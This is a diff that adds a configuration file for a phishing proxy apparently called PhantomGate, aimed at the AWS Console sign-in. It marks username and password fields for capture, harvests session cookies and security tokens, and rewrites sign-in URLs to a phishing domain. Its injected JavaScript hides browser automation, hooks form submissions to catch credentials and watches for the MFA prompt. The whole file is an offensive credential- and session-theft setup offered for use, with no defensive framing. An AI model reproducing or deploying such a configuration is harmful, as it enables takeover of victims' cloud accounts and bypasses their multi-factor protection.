@@ -1,0 +1,80 @@
+name: AWS Console
+author: PhantomGate
+version: 2.0.0
+description: Amazon Web Services Console authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - signin.aws.amazon.com
+    - console.aws.amazon.com
+    - amazonaws.com
+  
+  login:
+    domain: signin.aws.amazon.com
+    path: /signin
+    username:
+      selector: "input#user_name_input"
+      capture: true
+    password:
+      selector: "input#user_password_input"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: aws-user-info
+        regex: ".*"
+      - name: session-id
+        regex: ".*"
+      - name: session-token
+        regex: ".*"
+      - name: x-amz-security-token
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: signin.aws.amazon.com
+      inject: true
+    - domain: console.aws.amazon.com
+      inject: true
+  
+  sub_filters:
+    - domain: signin.aws.amazon.com
+      search: "https://signin.aws.amazon.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - AWS Console
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#user_name_input');
+        var password = form.querySelector('#user_password_input');
+        if (username && password) {
+          console.log('[PhantomGate] AWS credentials captured');
+        }
+      }, true);
+      
+      // Monitor for MFA prompt
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var mfa = node.querySelector('input[name="mfa_code"]');
+              if (mfa) {
+                console.log('[PhantomGate] MFA prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
